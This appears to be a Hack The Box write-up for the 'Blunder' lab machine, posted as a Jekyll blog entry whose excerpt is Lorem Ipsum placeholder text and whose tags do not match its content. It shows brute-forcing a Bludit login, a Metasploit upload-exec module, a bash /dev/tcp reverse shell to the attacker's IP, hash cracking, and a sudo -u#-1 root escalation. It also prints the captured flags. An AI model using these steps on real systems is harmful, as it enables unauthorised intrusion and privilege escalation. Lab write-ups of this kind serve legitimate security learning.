---
layout: single
title: Blunder - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-06-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-blunder/blunder_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-blunder/blunder_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. root@nidus:/git/htb/cache# nmap -Pn -sC -sV -n 10.10.10.191
    PORT   STATE  SERVICE VERSION
      21/tcp closed ftp
      80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
      |_http-generator: Blunder
      |_http-server-header: Apache/2.4.41 (Ubuntu)
      |_http-title: Blunder | A blunder of interesting facts

    DIRB:
      + http://10.10.10.191/0 (CODE:200|SIZE:7562)
      + http://10.10.10.191/about (CODE:200|SIZE:3281)
      ==> DIRECTORY: http://10.10.10.191/admin/
      + http://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)
      + http://10.10.10.191/LICENSE (CODE:200|SIZE:1083)
      + http://10.10.10.191/robots.txt (CODE:200|SIZE:22)
      + http://10.10.10.191/server-status (CODE:403|SIZE:277)

    NIKTO:
      + "robots.txt" contains 1 entry which should be manually viewed.

    FFUF dirb/common.txt (.php, .html, .txt):
      install.php        [Status: 200, Size: 30, Words: 5, Lines: 1]
      robots.txt         [Status: 200, Size: 22, Words: 3, Lines: 2]
      todo.txt           [Status: 200, Size: 118, Words: 20, Lines: 5]

2. Looking at the webpage we find nothing really of use. Dirb gives us a login under /admin, however we don't have any creds.
   install.php only says that Bludit is already installed
   robots.txt hows nothing
   todo.txt however gives us something;

    -Update the CMS
    -Turn off FTP - DONE
    -Remove old users - DONE
    -Inform fergus that the new blog needs images - PENDING

  My conclusion from this - CMS is old version, and there are probably a user named fergus.


3. Looking through the source code of the webpage we find that the software version is 3.9.2.

    <!-- Include Bootstrap CSS file bootstrap.css -->
    <link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">

  Looking for vulnerabilities in Bludit 3.9.2 we find a page and a script to bypass brute force protection.
  https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb

  Enter found username (fergus), along with the url and standard wordlist rockyou.txt - no dice. We're missing something here
  the password doesn't seem the be a default from rockyou.txt.

  Using cewl we can try to create our own, custom, wordlist.
    root@nidus:/git/htb/blunder# cewl -w blunder-wl.txt -d 4 -m 5 http://10.10.10.191
    root@nidus:/git/htb/blunder# cat brute.py
      #!/usr/bin/env python3
      import re
      import requests

      host = "http://10.10.10.191" # change to the appropriate URL

      login_url = host + '/admin/'
      username = 'fergus' # Change to the appropriate username
      fname = "blunder-wl.txt" #change this to the appropriate file you can specify the full path to the file
      ..

    root@nidus:/git/htb/blunder# python3 brute.py
      ..
      [*] Trying: RolandDeschain

      SUCCESS: Password found!
      Use fergus:RolandDeschain to login.


  4. We are now able to access /admin. Continue to enumerate for Bludit 3.9.2 vulns and we find a Code Execution vuln in the
     upload function.

     https://github.com/bludit/bludit/issues/1081
     I tried to get this exploit to work manually, however I wasn't able to. So instead I went to the msf module
     'linux/http/bludit_upload_images_exec' that gave a reverse meterpreter shell right away.

     msf5 exploit(linux/http/bludit_upload_images_exec) > options

      Module options (exploit/linux/http/bludit_upload_images_exec):

         Name        Current Setting      Required  Description
         ----        ---------------      --------  -----------
         BLUDITPASS  RolandDeschain       yes       The password for Bludit
         BLUDITUSER  fergus               yes       The username for Bludit
         Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
         RHOSTS      10.10.10.191         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
         RPORT       80                   yes       The target port (TCP)
         SSL         false                no        Negotiate SSL/TLS for outgoing connections
         TARGETURI   /                    yes       The base path for Bludit
         VHOST                            no        HTTP server virtual host

     msf5 exploit(linux/http/bludit_upload_images_exec) > run

       [*] Started reverse TCP handler on 10.10.14.17:4488
       [+] Logged in as: fergus
       [*] Retrieving UUID...
       [*] Uploading umtMhoBAyo.png...
       [*] Uploading .htaccess...
       [*] Executing umtMhoBAyo.png...
       [*] Sending stage (38288 bytes) to 10.10.10.191
       [*] Meterpreter session 1 opened (10.10.14.17:4488 -> 10.10.10.191:53692) at 2020-06-04 17:53:55 +0200
       [+] Deleted .htaccess

       meterpreter > shell
        Process 4654 created.
        Channel 1 created.
        whoami
        www-data


5. Looking around in the box we find 2 hashed passwords in /var/www/bludit-3.9.2/bl-content/databases, however we are unable to
   crack them. Enumerating further we find their new, updated version bludit 3.10 directory. Browsing to the database dir we find
   a new user hash.

   pwd
    /var/www/bludit-3.10.0a/bl-content/databases
   cat users.php
    <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
    {
        "admin": {
            "nickname": "Hugo",
            "firstName": "Hugo",
            "lastName": "",
            "role": "User",
            "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",

     rockyou.txt doesn't contain the password, so using crackstation.net solved it for us - Password120

     su hugo
      Password: Password120
     whoami
      hugo
     cat /home/hugo/user.txt
      7648136cd484168abf3ba60f6687fe65


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. The reverse meterpreter shell won't allow us to execute 'sudo -l', so start by creating a new reverse shell - and upgrade it.

    bash -i >& /dev/tcp/10.10.14.17/4488 0>&1
    root@nidus:/git/htb/blunder# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.17] from (UNKNOWN) [10.10.10.191] 54502
      bash: cannot set terminal process group (1093): Inappropriate ioctl for device
      bash: no job control in this shell
      hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$


    hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -l
      Password:
      Matching Defaults entries for hugo on blunder:
          env_reset, mail_badpass,
          secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

      User hugo may run the following commands on blunder:
          (ALL, !root) /bin/bash


2. A quick google on '(ALL, !root) /bin/bash' shows us that we can escalate privs using 'sudo -u#-1 /bin/bash'

    hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ sudo -u#-1 /bin/bash
    root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# whoami
      root
    root@blunder:/var/www/bludit-3.10.0a/bl-content/databases# cat /root/root.txt
      4f812395afcaa35870cc99487a7ef108




██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
